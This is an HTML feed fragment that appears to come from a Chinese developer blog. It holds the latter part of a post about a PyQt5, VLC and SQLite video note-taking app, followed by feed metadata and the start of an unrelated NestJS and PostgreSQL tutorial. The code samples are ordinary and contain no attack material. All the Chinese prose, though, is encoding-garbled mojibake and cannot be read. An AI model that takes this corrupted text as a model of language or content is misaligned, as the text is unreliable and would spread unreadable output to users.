<h2 data-id="heading-5">æŠ€æœ¯å®ç°æ–¹æ¡ˆ</h2>
<p>é¡¹ç›®é‡‡ç”¨ç»å…¸çš„<strong>ä¸‰å±‚æ¶æ„</strong>ï¼Œä»£ç ç»“æ„æ¸…æ™°æ˜“æ‰©å±•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">video-player-notes/
â”œâ”€â”€ gui/                 <span class="hljs-comment"># ç”¨æˆ·ç•Œé¢å±‚ï¼ˆPyQt5ï¼‰</span>
â”œâ”€â”€ services/            <span class="hljs-comment"># ä¸šåŠ¡é€»è¾‘å±‚</span>
â”œâ”€â”€ repositories/        <span class="hljs-comment"># æ•°æ®æŒä¹…å±‚ï¼ˆSQLiteï¼‰</span>
â”œâ”€â”€ models/              <span class="hljs-comment"># æ•°æ®æ¨¡å‹</span>
â””â”€â”€ main.py             <span class="hljs-comment"># åº”ç”¨å…¥å£</span>
</code></pre>
<h3 data-id="heading-6">1. è§†é¢‘æ’­æ”¾ï¼šVLC + PyQt5</h3>
<p>è§†é¢‘æ’­æ”¾ä½¿ç”¨ <code>python-vlc</code> ä½œä¸ºåç«¯ï¼Œ<code>PyQt5</code> ä½œä¸ºå‰ç«¯å®¹å™¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QWidget, QVBoxLayout
<span class="hljs-keyword">import</span> vlc

<span class="hljs-keyword">class</span> <span class="hljs-title class_">VideoWidget</span>(<span class="hljs-title class_ inherited__">QWidget</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.instance = vlc.Instance()
        self.player = self.instance.media_player_new()

        <span class="hljs-comment"># åˆ›å»ºæ’­æ”¾å™¨å®¹å™¨</span>
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_video</span>(<span class="hljs-params">self, file_path: <span class="hljs-built_in">str</span></span>):
        media = self.instance.media_new(file_path)
        self.player.set_media(media)
        self.player.play()
</code></pre>
<p><strong>å…³é”®æŠ€æœ¯ç‚¹</strong>ï¼š</p>
<ul>
<li>VLC æä¾›å¼ºå¤§çš„è§†é¢‘è§£ç èƒ½åŠ›ï¼Œæ”¯æŒå‡ ä¹æ‰€æœ‰æ ¼å¼</li>
<li>PyQt5 çš„ QWidget ä½œä¸º VLC æ’­æ”¾å™¨çš„çˆ¶å®¹å™¨</li>
<li>é€šè¿‡ <code>set_hwnd()</code> æ–¹æ³•å°†æ’­æ”¾å™¨åµŒå…¥åˆ°çª—å£ä¸­</li>
</ul>
<h3 data-id="heading-7">2. æ—¶é—´æˆ³ç®¡ç†</h3>
<p>æ—¶é—´æˆ³æ˜¯æ•´ä¸ªåº”ç”¨çš„æ ¸å¿ƒï¼Œéœ€è¦ç²¾ç¡®è®°å½•å’Œå¿«é€Ÿè·³è½¬ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Timestamp</span>:
    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span>
    note_id: <span class="hljs-built_in">int</span>
    position: <span class="hljs-built_in">float</span>  <span class="hljs-comment"># è§†é¢‘ä½ç½®ï¼ˆç§’ï¼‰</span>
    display_time: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># æ ¼å¼åŒ–æ˜¾ç¤º (MM:SS)</span>
    content: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># æ—¶é—´æˆ³å…³è”çš„å†…å®¹</span>

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_position</span>(<span class="hljs-params">cls, note_id: <span class="hljs-built_in">int</span>, position: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-string">'Timestamp'</span>:
        <span class="hljs-string">"""ä»è§†é¢‘ä½ç½®åˆ›å»ºæ—¶é—´æˆ³"""</span>
        minutes = <span class="hljs-built_in">int</span>(position // <span class="hljs-number">60</span>)
        seconds = <span class="hljs-built_in">int</span>(position % <span class="hljs-number">60</span>)
        display_time = <span class="hljs-string">f"<span class="hljs-subst">{minutes:02d}</span>:<span class="hljs-subst">{seconds:02d}</span>"</span>
        <span class="hljs-keyword">return</span> cls(
            <span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>,
            note_id=note_id,
            position=position,
            display_time=display_time,
            content=<span class="hljs-string">""</span>
        )

<span class="hljs-comment"># åœ¨ç¬”è®°ç¼–è¾‘å™¨ä¸­æ’å…¥æ—¶é—´æˆ³</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">insert_timestamp</span>(<span class="hljs-params">self</span>):
    current_time = self.video_service.get_current_position()
    timestamp = Timestamp.from_position(
        note_id=self.current_note.<span class="hljs-built_in">id</span>,
        position=current_time
    )

    <span class="hljs-comment"># æ’å…¥ Markdown æ ¼å¼çš„æ—¶é—´æˆ³é“¾æ¥</span>
    timestamp_link = <span class="hljs-string">f"[<span class="hljs-subst">{timestamp.display_time}</span>](#t<span class="hljs-subst">{timestamp.position}</span>)"</span>
    self.note_editor.insert_text(timestamp_link)

    <span class="hljs-comment"># ä¿å­˜åˆ°æ•°æ®åº“</span>
    self.timestamp_service.save_timestamp(timestamp)
</code></pre>
<p><strong>äº®ç‚¹è®¾è®¡</strong>ï¼š</p>
<ul>
<li>æ—¶é—´æˆ³å­˜å‚¨ä¸º Markdown é“¾æ¥æ ¼å¼ <code>[MM:SS](#t123.45)</code></li>
<li>ç‚¹å‡»é“¾æ¥æ—¶è§£ææ—¶é—´å€¼ï¼Œè°ƒç”¨ <code>player.set_time()</code> è·³è½¬</li>
<li>æ•°æ®åº“æŒä¹…åŒ–æ‰€æœ‰æ—¶é—´æˆ³ï¼Œæ”¯æŒæœç´¢å’Œç»Ÿè®¡</li>
</ul>
<h3 data-id="heading-8">3. ç¬”è®°ç¼–è¾‘å™¨ï¼šMarkdown å®æ—¶é¢„è§ˆ</h3>
<p>ä½¿ç”¨ <code>python-markdown</code> å’Œ <code>Pygments</code> å®ç°å³æ—¶é¢„è§ˆï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> markdown
<span class="hljs-keyword">from</span> PyQt5.QtWebEngineWidgets <span class="hljs-keyword">import</span> QWebEngineView

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NoteEditor</span>(<span class="hljs-title class_ inherited__">QWidget</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.text_input = QTextEdit()
        self.preview = QWebEngineView()

        <span class="hljs-comment"># å®æ—¶é¢„è§ˆæ›´æ–°</span>
        self.text_input.textChanged.connect(self.update_preview)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_preview</span>(<span class="hljs-params">self</span>):
        raw_text = self.text_input.toPlainText()

        <span class="hljs-comment"># Markdown è½¬ HTML</span>
        md = markdown.Markdown(
            extensions=[<span class="hljs-string">'fenced_code'</span>, <span class="hljs-string">'tables'</span>, <span class="hljs-string">'codehilite'</span>]
        )
        html_content = md.convert(raw_text)

        <span class="hljs-comment"># æ·»åŠ è‡ªå®šä¹‰æ ·å¼</span>
        styled_html = <span class="hljs-string">f"""
        &lt;html&gt;
        &lt;head&gt;
            &lt;style&gt;
                body {{ font-family: 'Microsoft YaHei', sans-serif; }}
                code {{ background: #f4f4f4; padding: 2px 6px; }}
                pre {{ background: #2d2d2d; color: #f8f8f2; }}
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;<span class="hljs-subst">{html_content}</span>&lt;/body&gt;
        &lt;/html&gt;
        """</span>
        self.preview.setHtml(styled_html)
</code></pre>
<h3 data-id="heading-9">4. æ•°æ®æŒä¹…åŒ–ï¼šSQLite</h3>
<p>ä½¿ç”¨ SQLite å­˜å‚¨ç¬”è®°å’Œé¡¹ç›®æ•°æ®ï¼Œè½»é‡ä¸”æ— éœ€é¢å¤–é…ç½®ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db_connection</span>():
    conn = sqlite3.connect(<span class="hljs-string">'video_notes.db'</span>)
    conn.row_factory = sqlite3.Row
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
        conn.commit()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        conn.rollback()
        <span class="hljs-keyword">raise</span> e
    <span class="hljs-keyword">finally</span>:
        conn.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NoteRepository</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_note</span>(<span class="hljs-params">self, note: Note</span>) -&gt; <span class="hljs-built_in">int</span>:
        <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
            cursor = conn.cursor()
            <span class="hljs-keyword">if</span> note.<span class="hljs-built_in">id</span>:
                cursor.execute(<span class="hljs-string">"""
                    UPDATE notes SET content=?, updated_at=datetime('now')
                    WHERE id=?
                """</span>, (note.content, note.<span class="hljs-built_in">id</span>))
                <span class="hljs-keyword">return</span> note.<span class="hljs-built_in">id</span>
            <span class="hljs-keyword">else</span>:
                cursor.execute(<span class="hljs-string">"""
                    INSERT INTO notes (project_id, content)
                    VALUES (?, ?)
                """</span>, (note.project_id, note.content))
                <span class="hljs-keyword">return</span> cursor.lastrowid
</code></pre>
<h2 data-id="heading-10">å¿«é€Ÿä¸Šæ‰‹</h2>
<h3 data-id="heading-11">å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/Schuyler2025/video-player-note.git
<span class="hljs-built_in">cd</span> video-player-note
pip install -r requirements.txt
</code></pre>
<h3 data-id="heading-12">å¯åŠ¨åº”ç”¨</h3>
<pre><code class="hljs language-css" lang="css">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span>
</code></pre>
<h3 data-id="heading-13">å¸¸ç”¨å¿«æ·é”®</h3>
<ul>
<li><code>Space</code> - æ’­æ”¾/æš‚åœ</li>
<li><code>â† / â†’</code> - åé€€/å‰è¿› 5 ç§’</li>
<li><code>Ctrl+T</code> - æ’å…¥æ—¶é—´æˆ³</li>
<li><code>Ctrl+N</code> - æ–°å»ºç¬”è®°</li>
<li><code>Ctrl+S</code> - ä¿å­˜ç¬”è®°</li>
<li><code>Ctrl+E</code> - å¯¼å‡ºç¬”è®°</li>
</ul>
<h2 data-id="heading-14">å®æˆ˜åœºæ™¯ç¤ºä¾‹</h2>
<h3 data-id="heading-15">åœºæ™¯ 1ï¼šå­¦ä¹ ç®—æ³•è¯¾ç¨‹</h3>
<p>æ‰“å¼€ä¸€ä¸ªæ’åºç®—æ³•çš„è§†é¢‘ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">00:12 å¼€å§‹è®²è§£å†’æ³¡æ’åºåŸç†
å†’æ³¡æ’åºé€šè¿‡ç›¸é‚»å…ƒç´ æ¯”è¾ƒå’Œäº¤æ¢æ¥æ’åº...
æ—¶é—´å¤æ‚åº¦ï¼šO(nÂ²)
ç©ºé—´å¤æ‚åº¦ï¼šO(1)

05:34 ä»£ç å®ç°
def bubble_sort(arr):
    <span class="hljs-attr">n</span> = len(arr)
    for i in range(n):
        for j in range(0, n-i-1):
            if arr<span class="hljs-section">[j]</span> &gt; arr<span class="hljs-section">[j+1]</span>:
                arr<span class="hljs-section">[j]</span>, arr<span class="hljs-section">[j+1]</span> = arr<span class="hljs-section">[j+1]</span>, arr<span class="hljs-section">[j]</span>
</code></pre>
<p>å¤ä¹ æ—¶ï¼Œç‚¹å‡» <code>05:34</code> ç«‹å³è·³è½¬åˆ°ä»£ç è®²è§£éƒ¨åˆ†ï¼Œæ— éœ€æ‹–åŠ¨è¿›åº¦æ¡ã€‚</p>
<h3 data-id="heading-16">åœºæ™¯ 2ï¼šæŠ€æœ¯ä¼šè®®å½•åƒ</h3>
<p>è®°å½•ä¼šè®®äº®ç‚¹ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">01:23 äº§å“æ¶æ„æ›´æ–° - å¾®æœåŠ¡æ”¹é€ </span>
æ–°çš„æ¶æ„é‡‡ç”¨ Spring Cloud å…¨å®¶æ¡¶...

<span class="hljs-section">15:47 æ€§èƒ½ä¼˜åŒ–ç»éªŒ</span>
- å¼•å…¥ Redis ç¼“å­˜ï¼Œå“åº”æ—¶é—´ä» 500ms é™è‡³ 50ms
- æ•°æ®åº“åˆ†è¡¨åˆ†åº“ï¼ŒQPS æå‡ 10 å€

<span class="hljs-section">28:15 Q&amp;A ç¯èŠ‚ç²¾å½©é—®ç­”</span>
é—®ï¼šå¦‚ä½•å¤„ç†çƒ­ç‚¹æ•°æ®ï¼Ÿ
ç­”ï¼šé‡‡ç”¨å¤šçº§ç¼“å­˜ç­–ç•¥...
</code></pre>
<p>ä»¥åæƒ³å›é¡¾æŸä¸ªçŸ¥è¯†ç‚¹ï¼Œç‚¹å‡»å¯¹åº”æ—¶é—´æˆ³å³å¯ã€‚</p>
<h2 data-id="heading-17">é¡¹ç›®äº®ç‚¹æ€»ç»“</h2>
<p>è¿™ä¸ªé¡¹ç›®è™½ç„¶ä¸ç®—å¤æ‚ï¼Œä½†æœ‰å‡ ä¸ªå€¼å¾—å­¦ä¹ çš„åœ°æ–¹ï¼š</p>
<ol>
<li><strong>åˆ†å±‚æ¶æ„æ¸…æ™°</strong>ï¼šGUIã€Serviceã€Repository å„å¸å…¶èŒï¼Œä»£ç æ˜“ç»´æŠ¤</li>
<li><strong>ç”¨æˆ·ä½“éªŒä¼˜å…ˆ</strong>ï¼šå…¨é”®ç›˜æ“ä½œã€æ—¶é—´æˆ³è·³è½¬ã€è‡ªåŠ¨ä¿å­˜ç­‰ç»†èŠ‚å¤„ç†åˆ°ä½</li>
<li><strong>æŠ€æœ¯æ ˆæˆç†Ÿ</strong>ï¼šPyQt5 + VLC + SQLite éƒ½æ˜¯ç¨³å®šå¯é çš„æŠ€æœ¯</li>
<li><strong>å¯æ‰©å±•æ€§å¼º</strong>ï¼šæ”¯æŒå¯¼å‡ºã€é¡¹ç›®åˆ‡æ¢ï¼Œåç»­å¯æ·»åŠ æ›´å¤šåŠŸèƒ½</li>
</ol>
<h2 data-id="heading-18">æœªæ¥æ”¹è¿›æ–¹å‘</h2>
<ul>
<li>æ·»åŠ  OCR è¯†åˆ«ï¼Œæ”¯æŒæˆªå›¾å¹¶æå–æ–‡å­—åˆ°ç¬”è®°</li>
<li>æ”¯æŒè¯­éŸ³è¯†åˆ«ï¼Œè‡ªåŠ¨ç”Ÿæˆå­—å¹•å¹¶åŒæ­¥åˆ°ç¬”è®°</li>
<li>æ·»åŠ  AI è¾…åŠ©ï¼Œæ™ºèƒ½æ€»ç»“è§†é¢‘å†…å®¹</li>
<li>æ”¯æŒå¤šäººåä½œï¼Œå…±äº«ç¬”è®°å’Œæ ‡æ³¨</li>
</ul>
<h2 data-id="heading-19">å†™åœ¨æœ€å</h2>
<p>è¿™ä¸ªé¡¹ç›®ä»æƒ³æ³•åˆ°å®ç°åªç”¨äº†ä¸¤å‘¨æ—¶é—´ï¼Œä½†è§£å†³äº†æˆ‘å­¦ä¹ è§†é¢‘æ—¶çš„çœŸå®ç—›ç‚¹ã€‚<strong>å¥½å·¥å…·ä¸ä¸€å®šéœ€è¦å¤æ‚çš„æŠ€æœ¯ï¼Œå…³é”®æ˜¯æ‰¾åˆ°ç”¨æˆ·çš„çœŸå®éœ€æ±‚å¹¶ä¼˜é›…åœ°è§£å†³å®ƒã€‚</strong></p>
<p>å¦‚æœä½ ä¹Ÿç»å¸¸éœ€è¦çœ‹è§†é¢‘å­¦ä¹ ï¼Œä¸å¦¨è¯•è¯•è¿™ä¸ªåº”ç”¨ã€‚é¡¹ç›®æºç å·²å¼€æºï¼Œæ¬¢è¿ Star å’Œæ PRã€‚</p>
<blockquote>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchuyler2025%2Fvideo-player-note" target="_blank" title="https://github.com/Schuyler2025/video-player-note" ref="nofollow noopener noreferrer">github.com/Schuyler202â€¦</a></p>
<p>å¦‚æœè§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œç‚¹ä¸ªèµæ”¯æŒä¸€ä¸‹å§ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶ä¸Šæ‰‹ NestJS + PostgreSQLï¼šæ‰“é€ ç±»å‹å®‰å…¨ã€æ¨¡å—åŒ–çš„ä¼ä¸šçº§åç«¯æœåŠ¡]]></title>    <link>https://juejin.cn/post/7596905015367106560</link>    <guid>https://juejin.cn/post/7596905015367106560</guid>    <pubDate>2026-01-19T14:42:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367106560" data-draft-id="7596869784538742784" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ä»é›¶ä¸Šæ‰‹ NestJS + PostgreSQLï¼šæ‰“é€ ç±»å‹å®‰å…¨ã€æ¨¡å—åŒ–çš„ä¼ä¸šçº§åç«¯æœåŠ¡"/> <meta itemprop="keywords" content="åç«¯,NestJS,TypeScript"/> <meta itemprop="datePublished" content="2026-01-19T14:42:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ €ç§‹666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ä»é›¶ä¸Šæ‰‹ NestJS + PostgreSQLï¼šæ‰“é€ ç±»å‹å®‰å…¨ã€æ¨¡å—åŒ–çš„ä¼ä¸šçº§åç«¯æœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ €ç§‹666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:42:15.000Z" title="Mon Jan 19 2026 14:42:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ Node.js ç”Ÿæ€ä¸­ï¼ŒExpress è™½çµæ´»ä½†æ˜“â€œçƒ‚å°¾â€â€”â€”éšç€é¡¹ç›®è†¨èƒ€ï¼Œä»£ç é€æ¸å˜æˆâ€œæ„å¤§åˆ©é¢æ¡â€ã€‚è€Œ <strong>NestJS</strong> çš„å‡ºç°ï¼Œæ­£æ˜¯ä¸ºäº†è§£å†³è¿™ä¸€ç—›ç‚¹ã€‚</p>
<p>å®ƒåŸºäº TypeScript æ„å»ºï¼Œèåˆäº† Angular çš„ä¾èµ–æ³¨å…¥ä¸æ¨¡å—åŒ–æ€æƒ³ï¼Œæä¾›äº†ä¸€å¥—<strong>ä¼ä¸šçº§çš„å¼€å‘èŒƒå¼</strong>ï¼šç»“æ„æ¸…æ™°ã€ç±»å‹å®‰å…¨ã€æ˜“äºç»´æŠ¤å’Œæ‰©å±•ã€‚æœ¬æ–‡å°†å¸¦ä½ ï¼š</p>
<p>âœ… ä»é›¶åˆå§‹åŒ–é¡¹ç›®<br/>
âœ… æ·±å…¥ç†è§£æ ¸å¿ƒä¸‰è¦ç´ ï¼ˆModule/Controller/Serviceï¼‰<br/>
âœ… å¿«é€Ÿé›†æˆ PostgreSQL å®ç°æŒä¹…åŒ–<br/>
âœ… å°è£…æ•°æ®åº“è¿æ¥å¹¶ä¿éšœå®‰å…¨æ€§<br/>
âœ… æŒæ¡å…³é”®è¯­æ³•ç³–ä¸å·¥ç¨‹åŒ–æŠ€å·§</p>
<p>å…¨ç¨‹é«˜èƒ½ï¼Œæ— åºŸè¯ï¼ŒåŠ©ä½ å¿«é€Ÿå†™å‡ºâ€œåˆ«äººçœ‹äº†éƒ½è¯´ä¸“ä¸šâ€çš„åç«¯ä»£ç ï¼</p>
<hr/>
